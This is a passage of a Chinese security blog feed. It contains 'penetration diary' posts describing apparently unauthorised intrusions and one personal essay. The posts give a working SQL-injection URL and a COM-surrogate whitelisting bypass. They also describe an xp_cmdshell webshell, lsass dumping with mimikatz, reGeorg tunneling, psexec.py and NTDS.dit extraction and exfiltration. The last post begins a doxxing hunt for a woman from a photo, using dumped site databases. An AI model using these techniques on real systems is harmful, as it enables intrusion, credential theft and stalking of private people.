class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET SDK&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; sn&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;snk&lt;/span&gt;2. &lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\csc&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;EnterpriseServices&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dll &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;keyfile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;snk &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;library &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dll dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cs&lt;/span&gt;3. &lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;As&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Administrator&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\regsvcs&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dll&lt;/span&gt;4. &lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;From&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PowerShell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$b &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;New&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ComObject&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;bypass&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OR&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;From&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;VBScript&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Dim&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; obj &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Set&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; obj &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;dllguest.Bypass&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; 使用原作的demo：&lt;o:p&gt;&lt;/o:p&gt; &lt;o:p&gt;&lt;/o:p&gt; 虽然demo写的不是很完美，测试的时候出了很多错，但已经能够表明作者“利用白名单应用执行恶意代码”的目的。&lt;o:p&gt;&lt;/o:p&gt; &nbsp;&lt;o:p&gt;&lt;/o:p&gt; 0x03原文：&lt;o:p&gt;&lt;/o:p&gt; http://subt0x10.blogspot.com/2015/08/hiding-in-plain-sight-com-surrogate.html&lt;o:p&gt;&lt;/o:p&gt; https://github.com/subTee/ShmooCon-2015&lt;o:p&gt;&lt;/o:p&gt; http://subt0x10.blogspot.com/2015/08/application-whitelisting-bypasses-101.html&lt;o:p&gt;&lt;/o:p&gt; 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[我也成了上班族]]></title>
    <url>%2F2015%2F07%2F16%2Fe6-88-91-e4-b9-9f-e6-88-90-e4-ba-86-e4-b8-8a-e7-8f-ad-e6-97-8f%2F</url>
    <content type="text"><![CDATA[大学生活已经结束了，我加入了360攻防实验室，做安全研究。入职360的并没有让我去自己的岗位，而是参加了入职前的培训“飞扬培训营”，说实话，作为入职培训，本来我不是很抗拒的，课程也让我受益匪浅，但那些所谓的游戏环节，所谓的融合环节，本来让我还算可以接受，但那些游戏过后，leader无脑的洗脑讲话让我倍感厌恶。作为一个成年人，我很清楚我的未来，我的职业规划，以及我的人生，并不需要你所谓的开导引路。《第一份工作，请干满5年》你叫我写读后感，说实话，我真心没有想在北京待5年，最多3年我就要回成都，而那些所谓的360成功人献身说法，说实话我并不感冒。 去其糟粕，取其精华，培训中有我收获的。今天刚看完严歌苓的《扶桑》，书中扶桑对困境的淡然并不麻木，接受并不反抗，但心中依旧有自己的爱，自己原则，以及自己对人生的认定，自己对生活的认知。可能是每看完一本书都有自己的一些感性认知，让自己情绪变的有点敏感，忽然就想写一些东西。 人生真的何其其妙，有时候真的有点一见钟情的感觉，理性的认知让我克制又克制，可能是那些所谓的自尊作祟，总能找到自己的自卑点，让自己失去追求的勇气，总是自己找些自己都认为可笑的理由，去逃避。怕失败，怕自己的一厢情愿。 人的情感真是其妙的东西，有些总是让人不由自主的去掩饰，总是以虚假的强势来掩饰脆弱的情感。忽然让我想到高中的时候一个非常好的哥们说的一句话：“衣服都是穿给别人看的”。 理性的人总是爱让自己陷入无休止的纠结当中，总是担心以后的路，知道自己这样的畏首畏脚，机会是不会等待着让我们做好一切准备的，完美主义者的通病。 尝试的不去多想，就这样慢慢的走过，不时的不甘心闪现，装着若无其事工作和路过。 慢慢的压制自己的负面情绪，慢慢的勇敢走向自己想要的结果，我还需要一个适应的过程，还需要一段漫漫摸索的经历。 就这样吧，继续我的人生。 我想我一定会过我想过的生活，走我想走的路，做我想做的人，完成我想完成的人生。我现在并没有偏离，我依旧正确的走着······]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【小明渗透日记】小明也会代码审计]]></title>
    <url>%2F2015%2F05%2F07%2Fe3-80-90-e5-b0-8f-e6-98-8e-e6-b8-97-e9-80-8f-e6-97-a5-e8-ae-b0-e3-80-91-e5-b0-8f-e6-98-8e-e4-b9-9f-e4-bc-9a-e4-bb-a3-e7-a0-81-e5-ae-a1-e8-ae-a1%2F</url>
    <content type="text"><![CDATA[201x年1月10日&nbsp; &nbsp; 星期五&nbsp; &nbsp; 天气晴&nbsp; &nbsp; 宜搞站禁搞基&nbsp; &nbsp; 小明在工地已经搬砖一个月了，一张图体现小明生活现状。今天老大端着咖啡走了过来，用着赞许和认可的眼光看着我说：“小明啊，小伙子不错啊，这有个光荣的任务，你愿不愿意做？”。小明心里一顿诅咒，嘴上还是乖乖的说：“没问题”！&nbsp; &nbsp;0x01 渗透中的代码审计&nbsp; &nbsp; 渗透中的代码审计和平时挖漏洞还是有很大区别的，首先就是环境问题，必须把握程序所处环境（不要你挖个linux下才能执行的漏洞，而目标却是windows），比如：你发现网站有nginx的解析漏洞xxx.xx/1.php,你现在的目的就是挖一个能够把特定代码写道服务器上web目录的漏洞，然后你发现会有报错记录到日志文件的问题，然后直接报错中加入代码，然后访问日志文件/log/xx.log/1.php成功getshell。&nbsp; &nbsp; 说了那么多其实就是想说渗透中挖的漏洞可能在平时看上去并不算一个漏洞。渗透中挖掘漏洞重点是把握所处环境，把握自己需求，尽量的黑盒挖掘有用信息判断环境配置，然后再白盒代码。当然说道了代码审计，你必须得有代码啊，代码来源可能有很多种：1.程序开源的、2.搞了一个同源码搭建的其他网站、3.发现了个代码读取漏洞、4.svn源码泄漏、5.网站目录下来了个webroot.zip等等（这些基本是我遇到过的情况）0x02 按部就班找短板&nbsp; &nbsp; 拿出旁坐大牛给的二级域名神器（密码核武器），秒出二级域名，大致秒看来下，发现“Powered by X-Space 4.0 UC”，顿时我就高兴了，多人博客程序，国内两大多人博客程序lxblog（phpwind的）和SupeSite/X-Space（康盛的（康盛不熟，dz知道么））都停止更新了，也就是说漏洞没修补，啪啪啪wooyun一搜果然有人挖，你懂的，报错注入 &lt;span class=&quot;pln&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;com&quot;&gt;//xxx.xxxx.xxx/batch.common.php?action=modelquote&amp;amp;cid=1&amp;amp;name=members%20where%201=1%20and%201=(updatexml(1,concat(0x7c,(select%20username%20from%20supe_members%20where%20groupid=1%20order%20by%20uid%20limit%209,1),0x5e24),1))%23&lt;/span&gt;&nbsp; &nbsp; 通过这个注入我们获得了一下信息：&nbsp; &nbsp; 1.可访问数据库：dzbbs、supesite、ucenter，哈哈是康盛那一套。&nbsp; &nbsp; 2.sqlmap跑出所有管理员数据（加盐的不代表没有破解希望啊）&nbsp; &nbsp; 3.uc_key,这个才是重点，康盛全套东西都是以ucenter为用户数据核心的&nbsp; &nbsp; 通过以上的信息思路来了：&nbsp; &nbsp; 1.通过supesite注入–&gt;获取ucenter数据库中uc_key(dzbbs的uc_key和supesite的uc_key)–&gt;uc_key getshell&nbsp; &nbsp; 2.破解出一个管理员密码（dzbbs或supesite）–&gt;进后台getshell&nbsp; &nbsp; 说点题外话：上边提到lxblog让我想起来有一次搞站，也是搞不动了，但是发现了是lxblog的程序，没办法了，只有硬挖了，当时我灵机一动，跑去官网论坛翻阅bug报告留言，看见有人报告bug没有引起开发的重视，然后我通过这个bug快速挖了个前台注入和后台getshell0x02 细诉UC_KEY getsehll&nbsp; &nbsp; 1.寻找uc_key藏身处&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; a.配置文件&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; b.数据库&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; ucenter中必有&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; dz 7.2等数据库中有，dz x系列无&nbsp; &nbsp; 2.使用uc_key&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; a.康盛系列getshell（exp没时间全部写了）&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; b.第三方getshell（第三方程序使用ucenter，exp需特定自写）&nbsp; &nbsp; 3.一个exploit不能走天下&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; uc_key getshell的exp不是每个程序都通用的，有的加密函数不同，需自己本地测试&nbsp; &nbsp; 4.此次渗透日了狗&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 各种不可写，只有特定目录可写，uc_key getshell失败，但峰会路转的是破解出了一个管理员，于是自挖supesite后台getshell0x03&nbsp;被逼自己挖漏洞&nbsp; &nbsp; 按理说，supesite后台getshell，是很容易的，但是上面已经说了，各种不可写。&nbsp; &nbsp; 在这种情况下，不用写的getshell漏洞成了必经之路（什么远程文件包含，本地文件包含（包含日志文件），代码执行等等），最后我发现了一个类似插件上传的地方，插件上传一般是传压缩包，幸好压缩包放置目录是可写的，但是解压目录就不可写了，运气好的是，程序在解压压缩包后 在写入插件目录之前，有一个包含，包含的是压缩包里的一个特定文件，哈哈，于是构造特定压缩包，成功向可写目录写入webshell。（具体代码分析不写了，本来打算写的，但是前几个投稿乌云被pass，这篇是以前写好的稿子）0x04 总结&nbsp; &nbsp;&nbsp;最后成功拿到shell，小明累的头昏眼花回了家，已再无精力向吉泽老师学习新知识。ps：第2部分和第3部分，本打算各种详写，和代码分析，最后，投稿失败，打击信心，不写了。 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【小明渗透日记】小明要租房]]></title>
    <url>%2F2015%2F05%2F07%2Fe3-80-90-e5-b0-8f-e6-98-8e-e6-b8-97-e9-80-8f-e6-97-a5-e8-ae-b0-e3-80-91-e5-b0-8f-e6-98-8e-e8-a6-81-e7-a7-9f-e6-88-bf%2F</url>
    <content type="text"><![CDATA[201x年12月10日&nbsp; &nbsp; 星期二&nbsp; &nbsp; 天气晴&nbsp; &nbsp; 宜搞站禁约炮&nbsp; &nbsp;&nbsp;我是小明，小鸡那日了狗的拉我到xx搬砖，工地不给住宿，于是小明要租房，东走走西找找，花花花两天过去了，累成了狗，无赖之下找到xx中介，3000大洋中介费，我滴那个娘啊！看见他宣传单下角的网址，默默交了钱拿着宣传单回了家。0x01 引言&nbsp; &nbsp; 渗透、搞站、日网在相关书籍当中基本没有说关于渗透理论的知识，书籍中基本都是工具的使用+各种小方法和小技巧，很多公式性的东西都是大家常年搞站和朋友一起交流出的结果。在渗透中“渗透3通道”是总结出的一个特别好的结论。（ps：一定是我不喜欢看书）&nbsp; &nbsp; 渗透3通道：命令执行通道（渗透路线）、文件传输通道（大量数据拖取）、权限控制通道（木马后门控制战果）&nbsp; &nbsp; 本文只通过小明实际案例说下命令执行通道，其他的请期待以后的小明渗透日记。0x02 命令传输通道模型&nbsp; &nbsp;&nbsp;这个是目前最好使用的命令传输通道（当时里面也有很多坑，在特定环境还需细微改动），在以前很多老文章中会出现的老工具如：hd、lcx、xsocks、ssock、reDuh等等都不是太好用。0x03 寻找网络边界短板&nbsp; &nbsp; 二级域名测试、旁站测试、c段测试是常用的是手法，不知道大家还记不记得我在《【小明渗透日记】追寻女神》中说到过关于网站业务和功能分析，我们可以通过寻找业务关联网站和新业务网站（最新的和最老的往往是出现漏洞几率比较高的地方）。&nbsp; &nbsp; 通过查询目标各种广告和宣传，找到了近期的几个活动，不负众望，sqlerver 2008 sa权限注入，此过程不详述，都懂的windows2008+asp.net+sqlserver2008 构架的网站。sa权限注入，开xp_cmdshell,system权限，全程无尿点，但也遇到了坑，加不了账户360拦截着，于是用xp_cmdshell echo了菜刀一句话，找到sa密码用菜刀链接数据库，使用xp_cmdshell执行命令，使用 &lt;span class=&quot;pln&quot;&gt;procdump&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;accepteula &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;ma lsass&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;COMPUTERNAME&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;_lsass&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dmp&lt;/span&gt;dump lsass.exe内存回来，然后本地使用： &lt;span class=&quot;pln&quot;&gt;mimikatz &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# sekurlsa::minidump SUPERCOMPUTER_lsass.dmp&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;mimikatz &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# sekurlsa::logonPasswords full&lt;/span&gt;抓取明文，在搞其他目标的时候遇到相同的构架其实也遇到了其他很多坑，比如开不了xp_cmdshell、加不了账户、有安全产品拦截等等，这只能靠自己平时积累了，没有哪一种办法是万能的。&nbsp; &nbsp; 现在我们找到了突破口，一个ipconfig /all 跳出来了域，是一个域环境中的机器，幸运的是明文抓到了域控账号（其实也是情理之中的，因为我们搞的是新活动，管理员还在调试，肯定经常登录这台机器，这也算搞新活动的一个优点吧）&nbsp; &nbsp; 通过DNS初步确定了172.13.x.x是域控，下一步就该上域控拖东西了。关于什么域探测啊之类的文章多的很不累诉。0x03 搭建命令传输通道&nbsp; &nbsp; 1.reGeorg：Http socks5工具&nbsp; &nbsp; 下载地址：https://github.com/sensepost/reGeorg&nbsp;&nbsp; &nbsp; 使用：目标是.net的于是传文件中的tunnel.aspx上网站目录，然后本地执行&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; -p参数：指定socks5端口&nbsp; &nbsp; -l参数：执行本地地址默认为127.0.0.1，最好使用-l参数改成0.0.0.0，这样很好的使用proxifier在windows上连接&nbsp; &nbsp; 2.proxychain和proxifier&nbsp; &nbsp; 在kali下修改/etc/proxychains.conf 之中&nbsp; &nbsp;&nbsp;直接修改sock4 127.0.0.1 9090 为 sock5 127.0.0.1 8090&nbsp; &nbsp; 使用：proxychains 工具 工具参数&nbsp; &nbsp; 3.windows下使用proxifier&nbsp; &nbsp; 下载:百度各种破解版&nbsp; &nbsp; 配置：结合我们上边reGeorg工具开的socks5，由于我们使用的是0.0.0.0，我们可以在windows上连接。我kali虚拟机ip为192.168.56.131&nbsp; &nbsp; 工具栏profile–&gt;proxy servers–&gt;add&nbsp; &nbsp; 工具栏profile–&gt;proxification rules 修改default策略的action栏为direct。好了各种ok。&nbsp; &nbsp; 使用：我如我们想哪一个工具使用代理就直接右键–&gt;profixier–&gt;你自己配置的proxy，我使用mstsc.exe连接域控&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 4.psexec.py&nbsp; &nbsp; 这个工具让我们很好的有一个命令行去控制目标，为什么是py的呢？为什么不用psexec.exe,大牛告诉我psexec.exe是会在目标上建服务并且退出的时候不会删除的，所以还是psexec.py或者有个wmi版本的也可以。&nbsp; &nbsp; 下载：https://github.com/nick-o/impacket（psexec.py是impacket包中的东西，里面还有其他有意思的东西）&nbsp; &nbsp; 使用：下载好后先安装python setup.py install,&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;python pyexec.py administrator:password@127.0.0.1&nbsp;cmd&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; ssh和scp为目标机为linux的时候使用，由于此次目标为windows域，在此不多说。&nbsp; &nbsp; 命令传输通道搭建玩了，我们可以尽情的使用本地linux和windows上的任何工具，再说下里面的坑：&nbsp; &nbsp; 坑1：使用reGeorg时候，由于目标的脚本环境各种不同，reGeorg可能会报错，需要自己修改个别地方使用，成功率：jsp&gt;.net&gt;php&nbsp; &nbsp; 坑2：管理员在线的时候最好别上，使用psexec.py，在进程中可以看见一个随机数组成的进程名，一看就是有问题，所以搞站还得月黑风高&nbsp; &nbsp; 如看官还遇见过其他的坑，请指导0x04 拖域成员&nbsp; &nbsp; 这篇文章中介绍了两种拖域成员的方法《windows server 2012 用户hash抓取方法研究（本地 域）》，本地搭建的环境和实际环境还是有很大差距的，里面有一些坑，需要自己填。&nbsp; &nbsp; 我只说下我在本次渗透测试中成功的方法，不一定代表你在你目标中也能成功。&nbsp; &nbsp;&nbsp;ntdsutil.exe + QuarksPwDump.exe&nbsp;是一个坑如果你导出的ntds.dit文件太大QuarksPwDump.exe&nbsp;要报内存不足的错误（本地测试这个方法没有问题是因为你的ntds.dit文件太小(这个也是我猜测原因)，实际情况中ntds.dit一般都有几个G），所以我使用的是ntsutil.exe +PWPR(Passcape Windows Password Recovery)。&nbsp; &nbsp; 1.ntdsutil导出ntds.dit和system，使用《windows server 2012 用户hash抓取方法研究（本地 域）》中方法是没有问题的&nbsp; &nbsp;&nbsp;#ntdsutil&nbsp;&nbsp; &nbsp;&nbsp;#snapshot&nbsp;&nbsp; &nbsp;&nbsp;#activate instance ntds&nbsp;&nbsp; &nbsp;&nbsp;#create&nbsp;&nbsp; &nbsp;&nbsp;#mount {GUID}&nbsp;&nbsp; &nbsp;&nbsp;copy c:{挂载点}\WINDOWS\NTDS\NTDS.dit c:\NTDS_saved.dit (可手动复制)(新窗口复制)&nbsp; &nbsp;&nbsp;copy c:{挂载点}\WINDOWS\system32\config\system c:\system&nbsp; &nbsp;&nbsp;#unmount {GUID}&nbsp;&nbsp; &nbsp; #delete&nbsp;{GUID}&nbsp;&nbsp; &nbsp;&nbsp;#quit&nbsp;&nbsp; &nbsp;&nbsp;#quit&nbsp;&nbsp; &nbsp; 2.PWPR(Passcape Windows Password Recovery)&nbsp; &nbsp; 这个是一个收费软件（虽然有demo版本，但是不好用），破解版下载:http://www.ttrar.com/html/Passcape-Windows-Password-Recovery-Advanced.html&nbsp; &nbsp; 这个工具很强大，看官自己摸索，我只说下解域密码&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 里面有gpu破解，很快跑出来了&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 说下当我导出ntds.dit和system是怎么拖回来的，nsds.dit有2G，首先用rar分块打包（每块大小看自己网络环境），用资源共享net use，把它们传到web服务器的web目录下（这个步骤是内网比较快），然后使用迅雷或者什么百度云盘等各种云盘，给下载回来（自己网速不好就先离线）。这个过程有2个坑：&nbsp; &nbsp; 坑1：打包一定要加密，太大必须分块，apache最大文件下载支持2G（亲身受害过），所以别被掉坑了&nbsp; &nbsp; 坑2：一定要观察下网络中有没有什么流量监控设备（尼玛有一次下着下着就被发现了，打包后8个多G的邮件啊）0x05 辛苦的后渗透阶段&nbsp; &nbsp; 东西拖回来了，也解密了，我一直没说拖的域是什么域，其实是员工域，你懂的。得到了80%(有些没破解出来，nt hash 你懂不是lm hash)的员工账号密码。接下来就是累死人的阶段。&nbsp; &nbsp; 邮件、vpn、各种内部系统，&nbsp;怎么翻邮件已经在《【小明渗透日记】追寻女神》说过了。说下vpn，vpn在国内企业使用量最多的应该是深信服的sslvpn了，目标也是用的此种，登vpn有许多的坑。&nbsp; &nbsp; 深信服sslvpn版本多，遇到好多种版本了，并且这样sslvpn用ie最好用，进去后的界面差距很大（功能设定上的），有点是直接给你几个按钮，你点击进入内部系统，有点是直接显示你能够访问的ip段或指定ip的指定端口，还有的进去是给你一个虚拟化桌面（你懂的，虚拟化桌面类似终端机，使用终端机绕过手法，进去使用此台机器做跳板）。然后就是登录vpn要多登录，可能你登录几个都没有权限（最开始我sb觉得是他vpn有问题，怎么进去不能用），多登录找到有权限的。&nbsp; &nbsp; 各种内部系统，内部系统就多了，可以从vpn中发现很多内部系统，有3种系统是非常重要的：运维系统、文件共享系统、存储系统（有次遇到netapp，尼玛真是长见识了）。&nbsp; &nbsp; 比如此次目标找到了运维系统，你懂的帐号密码拓扑图一大堆，基本就完整控制了全部网络，运维手册简直就是渗透路线指导书。0x06 总结&nbsp; &nbsp; 搞完之后，最后发现，尼玛有意义么？没意义！什么也没干，来也匆匆去也匆匆，继续交房租继续板砖。 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【小明渗透日记】追寻女神]]></title>
    <url>%2F2015%2F05%2F06%2Fe3-80-90-e5-b0-8f-e6-98-8e-e6-b8-97-e9-80-8f-e6-97-a5-e8-ae-b0-e3-80-91-e8-bf-bd-e5-af-bb-e5-a5-b3-e7-a5-9e%2F</url>
    <content type="text"><![CDATA[201x年8月10日&nbsp; &nbsp; 星期二&nbsp; &nbsp; 天气晴&nbsp; &nbsp; 宜搞站禁撸管&nbsp; &nbsp;&nbsp;我是小明，性别男爱好女，年满18，优质单男。作为18岁的我，什么sex8、sis100、草榴、91porn等等，这些18岁以前的兴趣已经变为逝去的青春，作为一个成年人，我应该做些为国为民的大事。到底做什么大事呢？就在此时小木哪王八羔子发来一张图，尼玛今天禁撸管啊，只有撸站了。经我放大仔细观察，大胸蜂腰肥臀，尼玛我是干大事的人，这种低级观察应该属于我失去的青春了。0x01搜集信息整理思路&nbsp; &nbsp;&nbsp;1.使用google、百度图片搜索寻找图片出处&nbsp; &nbsp; 2.图片属于艺术照，猜测十有八九是嫩模，注意力集中主要模特网站&nbsp; &nbsp; ps:看着这张图我只能想到这两点，还有新看法的朋友请留言&nbsp; &nbsp; 通过搜索引擎得到很多信息（信息价值的判断很大程度上取决于经验，有些你感觉没用的信息或者忽视的信息，说不定大牛就会有很多其他的想法），在这里对比下百度和google图片搜索，google成功率高、有用信息多，当然也不能放过百度（说不定日了狗了呢），通过这样的图片搜索，搜索出很多可能有用信息的可能性10%左右，但是让我们确定她是谁的可能性还是很高的，我们不需要知道她的真实姓名，我们只要知道他的代号就行（不管是不是真实，但是是她常用的）。&nbsp; &nbsp; 从初步搜索我提取出几个有用信息：xxx 模特 水印中提取到网站 微博等信息，然后再通过搜索引擎发散搜索我提取到的信息，依次搜索记录提取（在此切记不要走“线型路”，要一层一层搜索整理提权完再进行下层次搜索）。&nbsp;对于这种网络嫩模，确定了几个重要点：x空网 x0x0网 腾讯微博 新浪微博（确定有用小信息：使用iphone 常住地北京 最近做什么 个人网络关系），以上都是细致的体力活，你一定这么认为，其实不然，在搜索的过程中头脑清新是很重要的，很多时候看着各种信息你的灵感就会来了。0x02重点攻破&nbsp; &nbsp; 1.查库x空网，拖取个人资料，反复收集查库，整理资料（不细说，都懂的struct2漏洞泛滥的时候，可把人累惨了）。&nbsp; &nbsp; 2.由于x0x0网是她最近注册和常使用，有艺术照和自拍生活照，初步判断是本人（此人不是很出名没有签约公司，没有经纪人（微博收集）），有必要拿x0x0数据。&nbsp; &nbsp; 确定了目标，喝杯咖啡，来口浓茶，吸根中南海。&nbsp; &nbsp; 使用wydomain等工具收集二级域名（ps:手动在google收集二级域名或者挂代理使用wydomain，手动使用site:xxx.xxx.xxx -www|mail|vpn顺便也可以搜下有没有报错网页）。&nbsp; &nbsp; 分析每一个二级网站：web程序、web容器、web服务器、各个子域名相互关联（直接关系：同服？同段？······间接关系：业务？功能？······）&nbsp; &nbsp; 